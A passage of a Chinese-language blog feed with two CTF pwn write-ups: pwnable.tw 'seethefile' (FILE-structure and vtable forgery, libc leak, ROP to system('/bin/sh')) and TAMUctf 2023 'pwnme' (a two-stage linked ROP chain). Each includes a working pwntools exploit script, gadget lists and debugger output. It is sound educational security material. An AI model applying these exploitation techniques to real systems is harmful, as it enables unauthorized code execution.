05:0014│     0xffffcb10 —▸ 0xf7fe76eb (_dl_fixup+11) ◂— add esi, 0x15915
06:0018│     0xffffcb14 ◂— 0x0
07:001c│     0xffffcb18 —▸ 0xf7fcd000 ◂— 0x1afdb0
08:0020│     0xffffcb1c —▸ 0xf7fcd000 ◂— 0x1afdb0
09:0024│     0xffffcb20 —▸ 0xffffcb88 ◂— 0x0
0a:0028│     0xffffcb24 —▸ 0xf7fedf10 (_dl_runtime_resolve+16) ◂— pop edx
0b:002c│     0xffffcb28 —▸ 0xf7e79ecb (fclose+11) ◂— add ebx, 0x153135
0c:0030│     0xffffcb2c ◂— 0x0
0d:0034│     0xffffcb30 —▸ 0xf7fcd000 ◂— 0x1afdb0
0e:0038│     0xffffcb34 —▸ 0xf7fcd000 ◂— 0x1afdb0
0f:003c│ ebp 0xffffcb38 —▸ 0xffffcb88 ◂— 0x0
10:0040│     0xffffcb3c —▸ 0x8048b14 (main+221) ◂— add esp, 0x10
11:0044│     0xffffcb40 —▸ 0x804c410 ◂— 0xfbad240c
12:0048│     0xffffcb44 —▸ 0x804b260 (name) ◂— '114514'
13:004c│     0xffffcb48 —▸ 0xffffcb88 ◂— 0x0
14:0050│     0xffffcb4c —▸ 0x8048a62 (main+43) ◂— sub esp, 8
15:0054│     0xffffcb50 ◂— 0x1
16:0058│     0xffffcb54 ◂— 0x8000
17:005c│     0xffffcb58 ◂— 0x5
18:0060│     0xffffcb5c ◂— '5aaaaaaabbbbbbbbccccccccdddddddd'
</code></pre></div></div>

<p>可以发现，此时esp和可控的位置之间相差了 0x60 个字节。于是我在libc中找到了这个gadget：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
</code></pre></div></div>

<p>有了这个gadget，我们就可以愉快地ROP了！直接 system(“/bin/sh”) 就行。</p>

<h3 id="结构体伪造">结构体伪造</h3>

<p>首先要伪造的是FILE结构体，其中我们需要关注的是flags字段和vtable字段。使用pwntools的API可以超级方便地完成这一步：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># fake file
</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>   <span class="c1"># name
</span></code></pre></div></div>

<p>根据vtable的定义，<code class="language-plaintext highlighter-rouge">__finish</code> 位于第三个指针处，在32位下就是0x8偏移处，因此我把它就直接放在name的地方。</p>

<p>最终伪造目标是这样（Fake Vtable除了__finish以外的值都不需要关心，因此我随意地在这里放了一个/bin/sh字符串）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name ─────►┌─────────────────┐ ─┬─
     Fake  │/bin/sh\0        │  │
     Vtable├────────┬────────┤  │
           │__finish│        │  │
           ├────────┴────────┤  │ 0x20
           │                 │  │
           │                 │  │
           │                 │  │
  fp ─────►├────────┬────────┤ ─┴─
           │fp+0x10 │        │
           ├────────┘        │
           │                 │
     ─────►├─────────────────┤
     Fake  │ Flag            │
     FILE

           ├─────────────────┤
           │(vtable)&amp;name    │
           └─────────────────┘
</code></pre></div></div>

<h3 id="exp脚本">EXP脚本</h3>

<p>细节：泄露libc时，由于buffer长度问题，libc基址不会在第一次就读取出来。但是我发现这一地址就是libc基址减去0x1000的偏移，因此我在这里加上0x1000就可以完成泄露。（一开始没发现这个，一位这个地址就是libc基址，因此卡了好久好久……）</p>

<p>最后输入选项的时候，payload以5开头，后面是ROP gadget。这样 <code class="language-plaintext highlighter-rouge">atoi(payload)</code> 的结果就是5，也就是选择exit功能。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
</span>
<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>

    <span class="c1"># leak libc_addr
</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"see"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/proc/self/maps"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"[heap]</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base -&gt; "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="c1"># libc_base = int(input("addr:"), 16)
</span>
    <span class="c1"># create rop chain
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"5"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xb</span>
    <span class="c1"># payload += pack(elf.symbols["puts"]) + pack(0) + pack(0x08048C90) # test
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B260</span><span class="p">)</span>

    <span class="c1"># fake file
</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>

    <span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0005ae90</span><span class="p">)</span>  <span class="c1"># fake vtable
</span>    <span class="n">name</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x14</span>
    <span class="n">name</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B280</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xc</span>  <span class="c1"># fake FILE pointer
</span>    <span class="n">name</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fileStr</span><span class="p">)</span>
    
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>后记：后来发现其实根本不用ROP，由于调用vtable中的函数时，参数就是自己的file pointer，所以只要在flag字段后面加上”;/bin/sh;”，然后把 <code class="language-plaintext highlighter-rouge">__finish</code> 设置成system地址，就可以直接get shell。见<a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/#seethefile">R4bb1t师傅的博客</a></p>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。]]></summary></entry><entry><title type="html">TAMUctf 2023 Pwnme - linked ROP chain</title><link href="https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html" rel="alternate" type="text/html" title="TAMUctf 2023 Pwnme - linked ROP chain" /><published>2023-05-04T15:55:01+08:00</published><updated>2023-05-04T15:55:01+08:00</updated><id>https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain</id><content type="html" xml:base="https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html"><![CDATA[<p>当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 <code class="language-plaintext highlighter-rouge">leave; ret</code> 或是 <code class="language-plaintext highlighter-rouge">xchg eax, esp</code> 等方法完成栈迁移。
但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18; call vul</code> 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。</p>

<p>比赛时和前辈两人看这题看了几个小时，找gadget找了很久也没做出来。比赛结束后发现了两个版本的做法，分别是<a href="https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/pwnme">官方的</a>和<a href="https://chovid99.github.io/posts/tamuctf-2023/#pwnme">Chovid99师傅的</a>的。官方的做法比较一般，并且和我们比赛时的思路完全一致（只是我们傻了没发现那个关键gadget），因此本文主要分析官方的做法。</p>

<!-- more -->

<p>题目给了两个binary：</p>
<ul>
  <li>pwnme：什么函数都没有，只有一个main函数调用了libpwnme库的pwnme函数。
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
</code></pre></div>    </div>
  </li>
  <li>libpwnme.so：pwnme函数，以及一个调用即get shell的win函数。
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      PIE enabled
</code></pre></div>    </div>
  </li>
</ul>

<p>漏洞函数很朴实，就是一个简单的栈溢出：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">pwnme</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">setup</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"pwn me"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x48uLL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我们的目标是调用win函数，但win函数位于libpwnme中，其地址是随机变化的。
我们ROP使用的gadget，要么来自于已知的地址，要么来自于经过partial overwrite的栈上已有的地址。
在这道题中，能够partial overwrite的只有__libc_start_main的返回地址，但这个地址和win函数差的很远（尽管它们的偏移是确定的值），需要爆破约12个bits才行。因此暂时放弃这种思路。</p>

<p>我们可以用到的gadget，只有pwnme binary中的gadget，然而这个binary除了调用pwnme的main函数之外，可以说啥都没有。GOT上除了__libc_start_main和pwnme就没有别的函数了。
不过，如果用心找找，还是能找到一些有用的gadget，我找到的如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x000000000040118b : pop rdi ; ret
0x0000000000401191 : mov rax, qword ptr [rdi] ; ret

0x0000000000401189 : pop rsi ; pop r15 ; ret
0x00000000004011b2 : sub rax, rsi ; ret

0x0000000000401010 : call rax
0x000000000040109c : jmp rax

0x0000000000401016 : ret
</code></pre></div></div>

<p>用这些gadget我们可以取出GOT中pwnme的地址，然后加上一个偏移并执行，这样就可以执行位于pwnme-0x18位置的win函数。但问题在于，题目允许溢出0x48字节，也就是从返回地址算起一共6个栏位（0x30）可以填ROP gadget。但使用这些gadget需要8*8=0x40字节才能完成对于pwnme的调用。</p>

<p>我比赛时想到了两种思路：</p>
<ol>
  <li>分多次ROP完成，想办法在前后两次ROP之间，保存第一次ROP的成果（比如尝试保存rax），存到不会改变的寄存器、栈上或者某个内存地址；</li>
  <li>减小rsp，这样就可以复用之前输入的、位于栈上高位的payload。</li>
</ol>

<p>对于第一种思路，我们寻找了很久gadget，并没有发现能够用上的，因此不得不放弃。
对于第二种思路，我们寻找了很久gadget，只找到了一个很难使用的 <code class="language-plaintext highlighter-rouge">pop rsp</code>，以及一些 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18; add rsp, 0x18</code> 这样完全没用的gadget。</p>

<p>但这个gadget其实就放在pwnme binary的main函数中：</p>

<p><img src="https://i.imgtg.com/2023/05/04/Ck43t.png" alt="" /></p>

<p>通过这个gadget，我们可以将payload的后一部分先写到栈上，然后返回到main函数中，借助 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18</code> 来向低位延申栈，然后再把payload的前一部分写到栈上，覆盖返回到main的gadget，构造一条完整的ROP链，如图所示：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      │        │    │        │
      ├────────┤    ├────────┤
      │Overflow│    │ROP     │
      │0x30 MAX│    │Part II │
      │        │    │        │
─────►│─ ─ ─ ─ ┤    ├────────┤◄─────
      │ret_addr│    │ROP     │
      ├────────┤    │Part I  │ sub rsp, 0x18
pwnme │savedrbp│    │        │
stack ├────────┤    │        │
      │Buffer  │    │        │
      │0x10    │    │        │
      │        │    │        │
─────►└────────┘    │─ ─ ─ ─ ┤◄─────
                    │        │
                    ├────────┤
                    │savedrbp│ pwnme
                    ├────────┤ stack
                    │Buffer  │
                    │0x10    │
                    │        │
                    └────────┘◄─────
</code></pre></div></div>

<p>图中第一次溢出时，将ret_addr覆盖为main的接近开头处，之后地址高位的部分填充payload后一部分。
第二次溢出时，填充payload前一部分，注意要把跳转到main的那个gadget给覆盖掉，完成两段ROP chain的链接。</p>

<p>理论上，只要从返回地址数起，能够溢出0x20字节，就可以完成上述操作。
如果将这种操作重复多次，就构造任意长度的ROP chain。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401199</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x4011b2</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401010</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"pwn"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x40118b</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"pwnme"</span><span class="p">])</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401191</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401189</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"pwn"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>另外，Chovid99师傅的解法也十分巧妙，是利用 <code class="language-plaintext highlighter-rouge">add byte ptr [rbp - 0x3d], bl</code> gadget修改pwnme binary中的GOT低位，来把pwnme地址变成win的地址。也很巧妙，学习！</p>]]></content><author><name></name></author><category term="pwn" /><category term="rop" /><summary type="html"><![CDATA[当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 leave; ret 或是 xchg eax, esp 等方法完成栈迁移。 但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 sub rsp, 0x18; call vul 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。]]></summary></entry></feed>